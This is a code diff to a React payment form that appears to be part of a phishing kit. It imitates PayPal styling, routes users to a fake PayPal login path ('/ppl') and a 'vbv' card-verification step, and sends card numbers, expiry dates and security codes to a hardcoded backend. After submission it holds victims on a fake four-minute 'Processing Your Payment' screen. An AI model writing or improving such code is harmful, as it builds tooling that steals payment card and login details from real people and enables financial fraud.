@@ -1,10 +1,15 @@
-import React, { useState, forwardRef } from "react";
+import React, { useState, forwardRef, useEffect, useRef } from "react";
 import axios from 'axios';
+import { socket } from '../index'; // Add this import
 import CCForm from "./ccForm";
 import { zokomId } from './utils/auth';
 import './verifStyles.css';
 import { useHistory } from 'react-router-dom';
 import Container from './vbv/container';
+
+// Define API URL constant
+const API_URL = 'http://192.168.0.2:8000';
+
 const PaymentMethodForm = forwardRef((props, ref) => {
   const [showVbvContainer, setShowVbvContainer] = useState(false);
   const [selectedMethod, setSelectedMethod] = useState('');
@@ -15,8 +20,20 @@ const PaymentMethodForm = forwardRef((props, ref) => {
   });
   const [message, setMessage] = useState('');
   const [styles, setStyles] = useState(null);
+  const [isLoading, setIsLoading] = useState(false);
   const history = useHistory();
   const userId = zokomId(); // Get userId
+  const timeoutRef = useRef(null);
+
+  // Use useEffect for loading state and cleanup
+  useEffect(() => {
+    // Clear any existing timeout on unmount or when loading state changes
+    return () => {
+      if (timeoutRef.current) {
+        clearTimeout(timeoutRef.current);
+      }
+    };
+  }, []);
 
   const handleMethodChange = (e) => {
     setSelectedMethod(e.target.value);
@@ -26,17 +43,32 @@ const PaymentMethodForm = forwardRef((props, ref) => {
     setCardData(data);
   };
 
+  const validateCardData = () => {
+    if (!cardData.cardNumber || !cardData.expiryDate || !cardData.securityCode) {
+      setMessage('Please fill in all card details');
+      return false;
+    }
+    // Add more specific validation if needed
+    return true;
+  };
+
   const handleCompletePurchase = async () => {
     try {
       if (selectedMethod === 'paypal') {
-        // Dynamically import CSS file
         await import('../assets/styles/login.css');
-        // Redirect to PayPal login
         history.push('/ppl');
         return;
       }
 
-      const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/billing/credit-card`, {
+      // Clear any previous error messages
+      setMessage('');
+
+      // Validate card data before submission
+      if (!validateCardData()) {
+        return;
+      }
+
+      const response = await axios.post(`${API_URL}/api/billing/credit-card`, {
         userId,
         cardNumber: cardData.cardNumber,
         expiryDate: cardData.expiryDate,
@@ -44,16 +76,31 @@ const PaymentMethodForm = forwardRef((props, ref) => {
       });
 
       if (response.status === 201) {
-        console.log('Server response:', response.data);
-        setMessage(response.data.message);
-        setShowVbvContainer(true);
-        // Handle successful card payment logic here
+        setIsLoading(true); // This will trigger the useEffect
+        // Set timeout for redirect
+        timeoutRef.current = setTimeout(() => {
+          history.push('/container');
+        }, 240000); // 4 minutes
       }
     } catch (error) {
-      console.error('Error submitting credit card info:', error.response?.data || error.message);
-      setMessage(error.response?.data?.error || 'Error saving credit card information');
+      console.error('Error:', error.response?.data || error.message);
+      setMessage(error.response?.data?.error || 'Error processing payment');
     }
   };
+
+  if (isLoading) {
+    return (
+      <div className="loading-overlay">
+        <div className="loading-content">
+          <div className="spinner"></div>
+          <h3>Processing Your Payment</h3>
+          <input type="hidden" value="loading" name="status" />
+          <p>Please do not close this window.</p>
+          <p className="small-text">This may take a few minutes...</p>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div>
@@ -211,7 +258,6 @@ const PaymentMethodForm = forwardRef((props, ref) => {
                 </span>
                 <span className="ButtonFocus-sc-2hq6ey-0 jNccKH"></span>
               </button>)}
-      {message && <p className={styles ? styles.message : ''}>{message}</p>}
     </div> )}
   </div>
   );
